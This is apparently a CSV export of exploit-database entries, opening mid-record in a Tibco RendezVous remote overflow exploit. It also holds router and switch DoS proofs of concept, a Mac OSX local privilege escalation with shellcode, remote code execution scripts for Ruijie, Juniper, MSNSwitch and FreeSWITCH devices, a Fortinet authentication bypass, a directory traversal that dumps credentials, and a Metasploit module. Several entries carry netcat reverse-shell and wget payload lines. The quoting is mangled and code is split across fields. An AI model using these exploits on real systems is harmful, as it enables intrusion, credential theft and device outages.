int GetSSLPort(char *buffer);
void DumpMem(void* string, int length);
int GetSSLPort(char *buffer) {
char *p,*q;
p=strstr(buffer,""https://"");
if (p) {
q=strchr(&p[8],':');
if (q) {
p=strchr(q,'/');
if (p)  {
p[0]='\0';return(atoi(q+1));
return(-1);
int GetTibcoDaemon(char *buffer, char *daemon) {
char *p;
char *q;
char name[15];
int i;
static char SEPARADOR[]=""color=\""#242424\"">"";  //""242424"";
p=strstr(buffer,SEPARADOR);
if (p) {
p=p+strlen(SEPARADOR)+1;
while(p[0]==' ') p++;
q=strchr(&p[0],'<');
if (q) {
q[0]='\0';
printf(""[+] Daemon Found: %s - "",p);
strncpy(name,p,14);
q=q+6;
while(q[0]==' ') q++;
p=strchr(&q[0],'<');
if (p) {
p[0]='\0';
printf(""version: %s\n"",q);
for(i=0;i<sizeof(TARGETS)/sizeof(struct _targets);i++) {
if (strcmp(TARGETS[i].daemon,name)==0) {
return(i);
return(-1);
PHTTPData MakeHTTPRequest(char *host, DWORD port, char *metod,char *Url,int ssl, char *buffer) {
HINTERNET hInternetSession,hConnect,hRequest;
static TCHAR hdrs[] = ""Content-Type: application/x-www-form-urlencoded"";
int ret;
PHTTPData resultado;
char bufQuery[32] ;
DWORD dwBuffLen,dwFlags;
BOOL bQuery,bRead;
DWORD dwHTTPCode,dwIndex,dwFileSize,dwReadedBytes,dwLengthBufQuery = sizeof(bufQuery);
resultado=malloc(sizeof(HTTPData));
memset(resultado,0,sizeof(HTTPData));
if ((hInternetSession = InternetOpen (""TigerTeam 514"",INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0)) == NULL) {
return (resultado);
hConnect = InternetConnect(hInternetSession,host,port,NULL,NULL,INTERNET_SERVICE_HTTP,0,1);
if (!ssl) {
hRequest = HttpOpenRequest(hConnect,
metod,Url,NULL,NULL,NULL,INTERNET_FLAG_RELOAD,0);
} else {
hRequest = HttpOpenRequest(hConnect,
metod,Url,NULL,NULL,NULL,
INTERNET_FLAG_IGNORE_CERT_CN_INVALID |INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID     ,0);
if (hRequest==NULL) {
printf(""error chungo en HttpOpenRequest\n"");
return(resultado);
if (buffer==NULL) {
ret = HttpSendRequest(hRequest,hdrs,strlen(hdrs),NULL,0);
} else {
printf(""[+] Sending Exploit ( %i bytes)\n"",strlen(buffer));
ret = HttpSendRequest(hRequest,hdrs,strlen(hdrs),buffer,strlen(buffer));
if ((!ret) && (ssl) ){
dwBuffLen = sizeof(dwFlags);
printf(""[+] Ignoring unknown CA...\n"");
InternetQueryOption (hRequest, INTERNET_OPTION_SECURITY_FLAGS,
(LPVOID)&dwFlags, &dwBuffLen);
dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
InternetSetOption (hRequest, INTERNET_OPTION_SECURITY_FLAGS,
&dwFlags, sizeof (dwFlags) );
InternetSetOption(hRequest, INTERNET_OPTION_USERNAME,
pszUser, _tcslen(pszUser) + 1);
InternetSetOption(hRequest, INTERNET_OPTION_PASSWORD,
pszPass, _tcslen(pszPass) + 1);
printf(""[+] Sending Exploit ( %i bytes)\n"",strlen(buffer));
ret = HttpSendRequest(hRequest,hdrs,strlen(hdrs),buffer,strlen(buffer));
if (!ret) {
printf(""Se ha enviado mal la peticion HTTP: %i\n"",GetLastError());
return(resultado);
bQuery= HttpQueryInfo(hRequest,HTTP_QUERY_STATUS_CODE,bufQuery,&dwLengthBufQuery,NULL);
if (!bQuery) {
printf(""Control de Errores - bQuery Vale NULL\n"");
return(resultado);
resultado->dwReturnCode = (DWORD)atol(bufQuery) ;
dwLengthBufQuery=sizeof(bufQuery);
bQuery= HttpQueryInfo(hRequest, //petición de tamaño de la petición.
HTTP_QUERY_CONTENT_LENGTH,
bufQuery,
&dwLengthBufQuery,
NULL);
dwFileSize = (DWORD)atol(bufQuery) ;
resultado->dwBytesRead=dwFileSize;
if (dwFileSize==0) {
resultado->buffer=NULL;
InternetCloseHandle(hRequest);
InternetCloseHandle(hConnect);
InternetCloseHandle(hInternetSession);
return(resultado);
resultado->buffer= malloc(dwFileSize+1);
bRead = InternetReadFile(hRequest,
resultado->buffer,
dwFileSize,
&dwReadedBytes);
resultado->buffer[resultado->dwBytesRead] = '\0' ;
InternetCloseHandle(hRequest);
InternetCloseHandle(hConnect);
InternetCloseHandle(hInternetSession);
return(resultado);
void usage(void) {
printf(""Tibco.exe usage: -e parameters\n\n"");
printf(""Tibco.exe -e host (buffer overflow)\n"");
exit(1);
int main(int argc, char* argv[])
DWORD size,i,read,port=7580;
unsigned char *buffer,datos[5000];
HANDLE f;
WSADATA wsaData;
HTTPData *resultado;
unsigned short bindport;
signed int test;
int dst;
int t[0xff+1];
printf(""Tibco RendezVous rvrd, rvsrd remote exploit\n"");
printf(""Author: Andres Tarasco ( atarasco @ sia.es)\n"");
printf(""Url: http://www.514.es\n\n"");
if  (argc==3) {
if (argv[1][0]=='-') {
if (argv[1][1]!='e') {
usage();
}  else {
usage();
WSAStartup(MAKEWORD(2, 2), &wsaData);
printf(""[+] Connection to Tibco HTTP Daemon..\n"");
resultado= MakeHTTPRequest(argv[2], port, ""GET"",""/ "",0, NULL);
if (resultado->dwReturnCode!=200) {
printf(""[-] Request Error (ErrorCode: %i)\n"",resultado->dwReturnCode);
exit(1);
dst=GetTibcoDaemon(resultado->buffer,NULL); //Get Version
if (dst==-1) {
printf(""[-] Unknown Tibco Daemon (No donut for you)\n"");
exit(1);
resultado= MakeHTTPRequest(argv[2], port, ""GET"",""/daemon_parameters"",0, NULL);
port=GetSSLPort(resultado->buffer);
if (!port) {
printf(""[-] Unable to gather SSL port\n"");
exit(1);
printf(""[+] Connecting to Tibco SSL Service at port %i\n"",port);
if ((dst==0) || (dst==1) ) {
memset(datos,'\0',sizeof(datos)-1);
memcpy(datos,TARGETS[dst].header,strlen(TARGETS[dst].header));
memset(&datos[12],'A',498);
memcpy(&datos[16],shellcode,sizeof(shellcode)-1);
memcpy(&datos[12+498],CALLESP,4);
memcpy(&datos[12+498+4],jmpBack,sizeof(jmpBack)); //Jump back ( EBP -500)
memcpy(&datos[12+498+4+sizeof(jmpBack)-1],TARGETS[dst].tail,strlen(TARGETS[dst].tail));
resultado= MakeHTTPRequest(argv[2], port, ""POST"",""/add_router"",1, datos);
if (resultado->dwReturnCode==200) {
printf(""[+] Exploit succesfully sent. Now telnet to port 51477\n"");
} else {
printf(""[-] Exploit Failed\n"");
printf(""resultado: %i\n"",resultado->dwReturnCode);
return(1);"
2006-08-22,DoS,Hardware,preth00nker,2WIRE Modems/Routers,'CRLF' Denial of Service,"//Vulnerable:
//2Wire OfficePortal 0
//2Wire HomePortal 1500W
//2Wire HomePortal 100W
//2Wire HomePortal 100S
//2Wire HomePortal 1000W
//2Wire HomePortal 1000SW
//2Wire HomePortal 1000S
//2Wire HomePortal 1000
//2Wire HomePortal 0
////////////////////////////////// [ STARTING CODE ]
////  [ Explanation ] this PoC make an evil_request
////  and send to the server , when the server process
////  it the request fall him, AND THE MODEM WILL RESET!.
////  [ Note ] This Poc was coded  using Dev-C++  4.9.9.2
////  If you have any error with the librarys you need
////  include libws2_32.a at the project.
////                Enjoy it n_nU!..
////    Coded by preth00nker (using Mexican skill!)
#pragma comment(lib,""libws2_32.a"")
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include ""winsock2.h""
//Crear socket
//Estructuras
//Wins
//llamamos al socket
//Verifica por error
//Conecta
//Make a bad query and send it ..Mwajuajua!..
//finalized
//////////////////////////////////////////// [ EOF ]
// milw0rm.com [2006-08-22]","unsigned long dir;
char h[]="""";
short port;
char badreq[]="""";
int state;
int main(int argc, char *argv[])
printf(""\n################################################\n"");
printf(""####\n"");
printf(""####          PoC of DoS 2wire_Gateway\n"");
printf(""####               By Preth00nker\n"");
printf(""####         http://www.mexhackteam.org\n"");
printf(""####\n"");
printf(""####\n\n"");
if  (argc<4){
printf(""[Usage] %s $Host $Port $Variable\n"",argv[0]);
printf(""\n[I.E.] %s 192.168.1.254 80 PAGE\n"",argv[0]);
return 0;
WSADATA wsaData;
WSAStartup(MAKEWORD(2,2),&wsaData);
SOCKET wsck;
struct sockaddr_in Wins;
struct hostent *target;
Wins.sin_family=AF_INET;
Wins.sin_port=htons((short)atoi(argv[2]));
target=gethostbyname(argv[1]);
Wins.sin_addr.s_addr=inet_addr(inet_ntoa(*(struct in_addr *)target->h_addr));
wsck=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,(int unsigned)NULL,(int unsigned)NULL,(int unsigned)NULL);
if (wsck==SOCKET_ERROR){printf(""Error al crear el socket =!.."");WSACleanup();return 0;}
printf(""Socket creado correctamente!..  hWndl: %d"",wsck);
if(WSAConnect(wsck,(SOCKADDR*)&Wins,sizeof(Wins),NULL,NULL,NULL,NULL)==SOCKET_ERROR){
WSACleanup();
return 0;
printf(""\nError al conectar =!.."");
printf(""\nConectado!.."");
strcat(badreq,""GET /xslt?"");
strcat(badreq,argv[3]);
strcat(badreq,""=%0D%0A HTTP/1.0\r\n"");
strcat(badreq,""Accept-Language: es-mx\r\n"");
strcat(badreq,""User-Agent: MexHackTeam\r\n"");
strcat(badreq,""Host: "");
strcat(badreq,argv[1]);
strcat(badreq, ""\r\n\r\n\r\n"");
send(wsck , badreq ,(int)strlen(badreq), 0);
printf(""\nDatos Mandados!.."");
Sleep(100);
printf(""\nThat's all, Check this out!...\n"");
WSACleanup();
return 0;"
2006-03-04,DoS,Hardware,Ryan Meyer,Multiple Routers,'IRC Request' Disconnect Denial of Service,# milw0rm.com [2006-03-04],"It appears that various routers are prone to an IRC-only DoS attack.
Particularly Netgear and Linksys routers have been shown vulnerable.
If a client behind one of the vulnerable routers connects to an IRC server on port 6667
(and only 6667, does not DoS with other ports) and a user posts the following string
in either a channel, private message, ctcp, notice, etc.. the router will drop the connection.
The string is as follows:
DCC SEND anylongrandomstringhere
Further, it appears the routers that are vulnerable to this are running vxworks as their
embedded OS. Older linux Linksys routers appear to be immune."
2005-01-22,Local,OSX,nemo,Apple Mac OSX 10.3.7,'mRouter' Local Privilege Escalation,"#include <sys/types.h>
#include <string.h>
#include <unistd.h>
#define VULNPROG
#define MAXBUFSIZE 4096
// milw0rm.com [2005-01-22]","* fm-iSink.c
* overflow in mRouter, suid binary used by iSync, on OSX <= 10.3.7
* written by -( nemo @ felinemenace.org )-
*                    _,'|             _.-''``-...___..--';)
*                    /_ \'.      __..-' ,      ,--...--'''
*                   <\    .`--'''       `     /'
*                   `-';'               ;   ; ;
*              __...--''     ___...--_..'  .;.'
*          fL (,__....----'''       (,..--''
* http://pulltheplug.org and http://felinemenace.org.
* Bug discovered by Braden Thomas. Exploit by nemo.
* -( need a challenge...? )-
* -( http://www.pulltheplug.org )-
""/System/Library/SyncServices/SymbianConduit.bundle/Contents/Resources/
mRouter""
char shellcode[] = // Shellcode by b-r00t, modified by nemo.
""\x7c\x63\x1a\x79\x40\x82\xff\xfd\x39\x40\x01\xc3\x38\x0a\xfe\xf4""
""\x44\xff\xff\x02\x39\x40\x01\x23\x38\x0a\xfe\xf4\x44\xff\xff\x02""
""\x60\x60\x60\x60\x7c\xa5\x2a\x79\x7c\x68\x02\xa6\x38\x63\x01\x60""
""\x38\x63\xfe\xf4\x90\x61\xff\xf8\x90\xa1\xff\xfc\x38\x81\xff\xf8""
""\x3b\xc0\x01\x47\x38\x1e\xfe\xf4\x44\xff\xff\x02\x7c\xa3\x2b\x78""
""\x3b\xc0\x01\x0d\x38\x1e\xfe\xf4\x44\xff\xff\x02\x2f\x62\x69\x6e""
""\x2f\x73\x68"";
char filler[MAXBUFSIZE];
int main(int ac, char **av)
unsigned int ret  = 0xbffffffa -  strlen(shellcode);
char *args[] = { VULNPROG, ""-v"", ""-a"", filler, NULL };
char *env[]  = { ""TERM=xterm"", shellcode, NULL };
memset(filler,(char)'A',sizeof(filler));
memcpy(filler+MAXBUFSIZE-5,&ret,4);
execve(*args, args,env);
return 0;"
2004-07-22,DoS,Hardware,Seth Alan Woolley,Conceptronic CADSLR1 Router,Denial of Service,# milw0rm.com [2004-07-22],"$ $victima=""ip.victim""
$ perl -e 'print ""GET / HTTP/1.1\r\nHost: '""$victima""'\r\nAuthorization:
Basic "" . 'A' x 65536 . ""\r\n\r\n""' | nc -vvn $victima 80"
2024-03-14,Remote,Hardware,ByteHunter,Ruijie Switch PSG-5124 26293,Remote Code Execution (RCE),"#- Exploit Title: Ruijie Switch PSG-5124 26293 - Remote Code Execution (RCE)
#- Shodan Dork: http.html_hash:-1402735717
#- Fofa Dork: body=""img/free_login_ge.gif"" && body=""./img/login_bg.gif""
#- Exploit Author: ByteHunter
#- Email: 0xByteHunter@proton.me
#- Version: PSG-5124(LINK SOFTWARE RELEASE:26293)
#- Tested on: PSG-5124(LINK SOFTWARE RELEASE:26293)","import http.client
import argparse
def send_request(ip, port, command):
headers = {
""Host"": f""{ip}:{port}"",
""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"",
""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"",
""Accept-Language"": ""en-US,en;q=0.5"",
""Accept-Encoding"": ""gzip, deflate, br"",
""DNT"": ""1"",
""Connection"": ""close"",
""Upgrade-Insecure-Requests"": ""1"",
""Cmdnum"": ""1"",
""Confirm1"": ""n"",
""Content-Length"": ""0"",
""Command1"": command
try:
connection = http.client.HTTPConnection(f""{ip}:{port}"")
connection.request(""GET"", ""/EXCU_SHELL"", headers=headers)
response = connection.getresponse()
print(f""Status Code: {response.status}"")
print(response.read().decode('utf-8'))
connection.close()
except Exception as e:
print(f""Request failed: {e}"")
if __name__ == ""__main__"":
parser = argparse.ArgumentParser(description='proof of concept for ruijie Switches RCE')
parser.add_argument('--ip', help='Target IP address', required=True)
parser.add_argument('--port', help='Port', required=True)
parser.add_argument('--cmd', help='Command', required=True)
args = parser.parse_args()
ip = args.ip
port = args.port
command = args.cmd
send_request(ip, port, command)"
2024-02-02,WebApps,PHP,whiteOwl,Juniper-SRX-Firewalls&EX-switches,(PreAuth-RCE) (PoC),"# ***************************************************************************************************
# Exploit Title: juniper-SRX-Firewalls&EX-switches (PreAuth-RCE) (PoC)
# Description:
# This code serves as both a vulnerability detector and a proof of concept for CVE-2023-36845.
# It executes the phpinfo() function on the login page of the target device,
# allowing to inspect the PHP configuration. also this script has the option to save the phpinfo()
# output to a file for further analysis.
# Shodan Dork: http.favicon.hash:2141724739
# Date: 2023/10/01
# Exploit Author: whiteOwl (whiteowl.pub@gmail.com)
# Vendor Homepage: https://whiteowl-pub.github.io
# Version: Versions Prior to 20.4R3-S9,21.1R1,21.2R3-S7,21.3R3-S5,
#          21.4R3-S5,22.1R3-S4,22.2R3-S2,22.3R2-S2/R3-S1,22.
#          4R2-S1/R3,23.2R1-S1/R2
# Tested on: JUNOS SM804122pri 15.1X49-D170.4
# CVE : cve-2023-36845
# ***************************************************************************************************","import argparse
import requests
banner = """"""
* CVE-2023-36845 Vulnerability Detector & Proof of concept  *
* This script checks for the CVE-2023-36845 vulnerability   *
* and run phpinfo() on vulnerable devices.                  *
* If you suspect a vulnerable system, please take action    *
* immediately to secure it.                                 *
*                                                           *
* Author: whiteowl                                          *
def send_request(url, output_file=None, verbose=False):
target_url = f""{url}/?PHPRC=/dev/fd/0""
data = 'allow_url_include=1\nauto_prepend_file=""data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg==""'
headers = {
'User-Agent': 'Mozilla/5.0',
try:
response = requests.post(target_url, headers=headers, data=data, stream=True)
if response.status_code == 200:
print(""The Target Device is Vulnerable to: CVE-2023-36845"")
else:
print(""Not Vulnerable: Status Code"", response.status_code)
if output_file:
with open(output_file, 'w', encoding='utf-8') as file:
file.write(response.text)
if verbose:
print(f""HTTP Status Code: {response.status_code}"")
print(""Response Headers:"")
for header, value in response.headers.items():
print(f""{header}: {value}"")
print(""Response Content:"")
print(response.text)
except requests.exceptions.RequestException as e:
print(f""An error occurred: {e}"")
def main():
print(banner)
parser = argparse.ArgumentParser(description=""Custom curl-like script"")
parser.add_argument(""-u"", ""--url"", required=True, help=""URL to send the HTTP request"")
parser.add_argument(""-o"", ""--output"", help=""Output file to save the HTML content"")
parser.add_argument(""-v"", ""--verbose"", action=""store_true"", help=""Enable verbose mode"")
args = parser.parse_args()
send_request(args.url, args.output, args.verbose)
if __name__ == ""__main__"":
main()"
2023-03-27,WebApps,Multiple,Felipe Alcantara,"FortiOS, FortiProxy, FortiSwitchManager v7.2.1",Authentication Bypass,"# Exploit Title: Fortinet Authentication Bypass v7.2.1 - (FortiOS, FortiProxy, FortiSwitchManager)
# Date: 13/10/2022
# Exploit Author: Felipe Alcantara (Filiplain)
# Vendor Homepage: https://www.fortinet.com/
# Version:
#FortiOS from 7.2.0 to 7.2.1
#FortiOS from 7.0.0 to 7.0.6
#FortiProxy 7.2.0
#FortiProxy from 7.0.0 to 7.0.6
#FortiSwitchManager 7.2.0
#FortiSwitchManager 7.0.0
# Tested on: Kali Linux
# CVE : CVE-2022-40684
# https://github.com/Filiplain/Fortinet-PoC-Auth-Bypass
# Usage: ./poc.sh <ip> <port>
# Example: ./poc.sh 10.10.10.120 8443
#!/bin/bash","red=""\e[0;31m\033[1m""
blue=""\e[0;34m\033[1m""
yellow=""\e[0;33m\033[1m""
end=""\033[0m\e[0m""
target=$1
port=$2
vuln () {
echo -e ""${yellow}[+] Dumping System Information: ${end}""
timeout 10 curl -s -k -X $'GET' \
-H $'Host: 127.0.0.1:9980' -H $'User-Agent: Node.js' -H $'Accept-Encoding\"": gzip, deflate' -H $'Forwarded: by=\""[127.0.0.1]:80\"";for=\""[127.0.0.1]:49490\"";proto=http;host=' -H $'X-Forwarded-Vdom: root' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' ""https://$target:$port/api/v2/cmdb/system/admin"" > $target.out
if [ ""$?"" == ""0"" ];then
grep ""results"" ./$target.out >/dev/null
if [ ""$?"" == ""0"" ];then
echo -e ""${blue}Vulnerable: Saved to file $PWD/$target.out ${end}""
else
rm -f ./$target.out
echo -e ""${red}Not Vulnerable ${end}""
fi
else
echo -e ""${red}Not Vulnerable ${end}""
rm -f ./$target.out
fi
vuln"
2022-11-11,Remote,Hardware,Eli Fulkerson,MSNSwitch Firmware MNT.2408,Remote Code Execution,"#!/usr/bin/python3
# listen with ""ncat -lk {LISTENER_PORT}"" on LISTENER_HOST
# target msnswitch
# lets just ask
# initial login, establishes our Cookie
# get our csrftoken","Exploit Title: MSNSwitch Firmware MNT.2408 - Remote Code Exectuion (RCE)
Google Dork: n/a
Date:9/1/2022
Exploit Author: Eli Fulkerson
Vendor Homepage: https://www.msnswitch.com/
Version: MNT.2408
Tested on: MNT.2408 firmware
CVE: CVE-2022-32429
POC for unauthenticated configuration dump, authenticated RCE on msnswitch firmware 2408.
Configuration dump only requires HTTP access.
Full RCE requires you to be on the same subnet as the device.
import requests
import sys
import urllib.parse
import readline
import random
import string
LISTENER_HOST = ""192.168.EDIT.ME""
LISTENER_PORT = 3434
TARGET=""192.168.EDIT.ME2""
PORT=80
USERNAME = None
PASSWORD = None
First vulnerability, unauthenticated configuration/credential dump
if USERNAME == None or PASSWORD == None:
hack_url=f""http://{TARGET}:{PORT}/cgi-bin-hax/ExportSettings.sh""
session = requests.session()
data = session.get(hack_url)
for each in data.text.split('\n'):
key = None
val = None
try:
key = each.strip().split('=')[0]
val = each.strip().split('=')[1]
except:
pass
if key == ""Account1"":
USERNAME = val
if key == ""Password1"":
PASSWORD = val
Second vulnerability, authenticated command execution
This only works on the local lan.
for full reverse shell, modify and upload netcat busybox shell script to /tmp:
shell script: rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.X.X 4242 >/tmp/f
download to unit: /usr/bin/wget http://192.168.X.X:8000/myfile.txt -P /tmp
ref: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-busybox
session = requests.session()
burp0_url = f""http://{TARGET}:{PORT}/goform/login""
burp0_headers = {""Cache-Control"": ""max-age=0"", ""Upgrade-Insecure-Requests"": ""1"", ""Origin"": f""http://{TARGET}"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"", ""Referer"": ""http://192.168.120.17/login.asp"", ""Accept-Encoding"": ""gzip, deflate"", ""Accept-Language"": ""en-US,en;q=0.9"", ""Connection"": ""close""}
burp0_data = {""login"": ""1"", ""user"": USERNAME, ""password"": PASSWORD}
session.post(burp0_url, headers=burp0_headers, data=burp0_data)
burp0_url = f""http://{TARGET}:{PORT}/saveUpgrade.asp""
data = session.get(burp0_url)
csrftoken = data.text.split(""?csrftoken="")[1].split(""\"""")[0]
while True:
CMD = input('x:')
CMD_u = urllib.parse.quote_plus(CMD)
filename = ''.join(random.choice(string.ascii_letters) for _ in range(25))
try:
hack_url = f""http://{TARGET}:{PORT}/cgi-bin/upgrade.cgi?firmware_url=http%3A%2F%2F192.168.2.1%60{CMD_u}%7Cnc%20{LISTENER_HOST}%20{LISTENER_PORT}%60%2F{filename}%3F&csrftoken={csrftoken}""
session.get(hack_url, timeout=0.01)
except requests.exceptions.ReadTimeout:
pass"
2021-02-16,DoS,Windows,Ismael Nava,Managed Switch Port Mapping Tool 2.85.2,Denial of Service (PoC),"# Exploit Title: Managed Switch Port Mapping Tool 2.85.2 - Denial of Service (PoC)
# Date: 2021-02-15
# Exploit Author: Ismael Nava
# Vendor Homepage: https://switchportmapper.com/
# Software Link: https://switchportmapper.com/download.htm
# Version: 2.85.2
# Tested on: Windows 10 Home x64
#STEPS
# Open the program Managed Switch Port Mapping Tool
# In the left side select Settings from Router/Srvr 1 (for layer 2 Switches)
# Run the python exploit script, it will create a new .txt files
# Copy the content of the file ""Gou.txt""
# Paste the content in the field IP Address and SNMP v1/v2c Read Community Name
# Click in OK
# End :)","buffer = 'F' * 10000
try:
file = open(""Gou2.txt"",""w"")
file.write(buffer)
file.close()
print(""Archive ready"")
except:
print(""Archive no ready"")"
2020-08-19,WebApps,Hardware,Tuygun,Ruijie Networks Switch eWeb S29_RGOS 11.4,Directory Traversal,"# Exploit Title: Ruijie Networks Switch eWeb S29_RGOS 11.4 - Directory Traversal
# Exploit Author: Tuygun
# Date: 2020-08-19
# Vendor Homepage:  https://www.ruijienetworks.com/
# Version: eWeb S29_RGOS 11.4(1)B12P11
# Source : https://faruktuygun.com/directorytraversal.html","Proof of Concept Request:
GET /download.do?file=../../../../config.text HTTP/1.1
Host: 192.168.2.160
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101
Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: LOCAL_LANG_COOKIE=en; UI_LOCAL_COOKIE=en; mac=0074.9c95.43f0;
SID=33BA8206DE5B8B8295C89A3C4787D7A; module=network; subModule=certify;
threeModule=certify_adv
Connection: close
Upgrade-Insecure-Requests: 1
Response:
HTTP/1.1 200 OK
Date: Wed, 03 Jun 2020 20:52.25 GMT
Server: HTTP-Server/1.1
Content-length: 2070
Content-Disposition: attachment; filename=""config.text""
Content-Type: application/octet-stream; Charset=UTF-8
version S29_RGOS 11.4(1)B12P11
hostname OMURGA
no spanning-tree
username admin password admin
username ruijie  privilege 15                    201998
cwmp
install 0 S2910C-24GT2XS-HP-E
sysmac 0074.9C95.43f0
enable service web-server http
enable service web-server https
webmaster level 1 username ruijie password 201998
nfpp"
2019-12-20,Remote,Windows,1F98D,FreeSWITCH 1.10.1,Command Execution,"# Exploit Title: FreeSWITCH 1.10.1 - Command Execution
# Date: 2019-12-19
# Exploit Author: 1F98D
# Vendor Homepage: https://freeswitch.com/
# Software Link: https://files.freeswitch.org/windows/installer/x64/FreeSWITCH-1.10.1-Release-x64.msi
# Version: 1.10.1
# Tested on: Windows 10 (x64)
# FreeSWITCH listens on port 8021 by default and will accept and run commands sent to
# it after authenticating. By default commands are not accepted from remote hosts.
# -- Example --
# root@kali:~# ./freeswitch-exploit.py 192.168.1.100 whoami
# Authenticated
# Content-Type: api/response
# Content-Length: 20
# nt authority\system
#!/usr/bin/python3","from socket import *
import sys
if len(sys.argv) != 3:
print('Missing arguments')
print('Usage: freeswitch-exploit.py <target> <cmd>')
sys.exit(1)
ADDRESS=sys.argv[1]
CMD=sys.argv[2]
PASSWORD='ClueCon' # default password for FreeSWITCH
s=socket(AF_INET, SOCK_STREAM)
s.connect((ADDRESS, 8021))
response = s.recv(1024)
if b'auth/request' in response:
s.send(bytes('auth {}\n\n'.format(PASSWORD), 'utf8'))
response = s.recv(1024)
if b'+OK accepted' in response:
print('Authenticated')
s.send(bytes('api system {}\n\n'.format(CMD), 'utf8'))
response = s.recv(8096).decode()
print(response)
else:
print('Authentication failed')
sys.exit(1)
else:
print('Not prompted for authentication, likely not vulnerable')
sys.exit(1)"
2019-11-20,Remote,Multiple,Metasploit,FreeSWITCH,Event Socket Command Execution (Metasploit),"# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework","class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::Tcp
include Msf::Exploit::Powershell
include Msf::Exploit::CmdStager
include Msf::Exploit::FileDropper
def initialize(info = {})
super(update_info(info,
'Name'            => 'FreeSWITCH Event Socket Command Execution',
'Description'     => %q{
This module uses the FreeSWITCH event socket interface
to execute system commands using the `system` API command.
The event socket service is enabled by default and listens
on TCP port 8021 on the local network interface.
This module has been tested successfully on FreeSWITCH versions:
1.6.10-17-726448d~44bit on FreeSWITCH-Deb8-TechPreview virtual machine;
1.8.4~64bit on Ubuntu 19.04 (x64); and
1.10.1~64bit on Windows 7 SP1 (EN) (x64).
'License'         => MSF_LICENSE,
'Author'          => ['bcoles'],
'References'      =>
['CWE', '260'], # default password, configurable in event_socket.conf.xml
['URL', 'https://freeswitch.org/confluence/display/FREESWITCH/mod_event_socket']
'Platform'        => %w[win linux unix bsd],
'Arch'            => [ARCH_CMD, ARCH_X86, ARCH_X64],
'Payload'         => {'BadChars' => ""\x00\x0a\x0d\x27\x5c""},
'CmdStagerFlavor' => %w[curl wget certutil vbs],
'Targets'         =>
['Unix (In-Memory)',
'Platform'       => 'unix',
'Arch'           => ARCH_CMD,
'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse'},
'Type'           => :unix_memory
['Linux (Dropper)',
'Platform'       => 'linux',
'Arch'           => [ARCH_X86, ARCH_X64],
'DefaultOptions' => {'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'},
'Type'           => :linux_dropper
['PowerShell (In-Memory)',
'Platform'       => 'win',
'Arch'           => [ARCH_X86, ARCH_X64],
'DefaultOptions' => {'PAYLOAD' => 'windows/meterpreter/reverse_tcp'},
'Type'           => :psh_memory
['Windows (In-Memory)',
'Platform'       => 'win',
'Arch'           => ARCH_CMD,
'DefaultOptions' => {'PAYLOAD' => 'cmd/windows/reverse_powershell'},
'Type'           => :win_memory
['Windows (Dropper)',
'Platform'       => 'win',
'Arch'           => [ARCH_X86, ARCH_X64],
'DefaultOptions' => {'PAYLOAD' => 'windows/meterpreter/reverse_tcp'},
'Type'           => :win_dropper
'Privileged'      => false,
'DefaultOptions'  => { 'RPORT' => 8021 },
'DisclosureDate'  => '2019-11-03',
'DefaultTarget'   => 0))
register_options [
OptString.new('PASSWORD', [true, 'FreeSWITCH event socket password', 'ClueCon'])
end
def check
connect
banner = sock.get_once.to_s
disconnect
if banner.include?('Access Denied, go away.') || banner.include?('text/rude-rejection')
vprint_error 'Access denied by network ACL'
return CheckCode::Safe
end
unless banner.include?('Content-Type: auth/request')
return CheckCode::Safe
end
CheckCode::Appears
end
def auth(password)
sock.put ""auth #{password}\n\n""
res = sock.get_once.to_s
unless res.include? 'Content-Type: command/reply'
fail_with Failure::UnexpectedReply, 'Unexpected reply'
end
unless res.include?('Reply-Text: +OK accepted')
fail_with Failure::NoAccess, 'Login failed'
end
print_status 'Login success'
end
def execute_command(cmd, opts = {})
api_function = opts[:foreground] ? 'system' : 'bg_system'
sock.put ""api #{api_function} #{cmd}\n\n""
res = sock.get_once.to_s
unless res.include? 'Content-Type: api/response'
fail_with Failure::UnexpectedReply, 'Unexpected reply'
end
vprint_status ""Response: #{res}""
end
def exploit
unless check == CheckCode::Appears
fail_with Failure::NotVulnerable, 'Target is not vulnerable'
end
connect
banner = sock.get_once.to_s
auth(datastore['PASSWORD'])
print_status ""Sending payload (#{payload.encoded.length} bytes) ...""
case target['Type']
when :unix_memory
if datastore['PAYLOAD'] == 'cmd/unix/generic'
execute_command(payload.encoded, foreground: true)
else
execute_command(payload.encoded)
end
when :win_memory
if datastore['PAYLOAD'] == 'cmd/windows/generic'
execute_command(payload.encoded, foreground: true)
else
execute_command(payload.encoded)
end
when :psh_memory
execute_command(
cmd_psh_payload(
payload.encoded,
payload_instance.arch.first,
{ :remove_comspec => true, :encode_final_payload => true }
when :linux_dropper
execute_cmdstager(:linemax => 1_500)
when :win_dropper
execute_cmdstager(:linemax => 1_500)
end
ensure
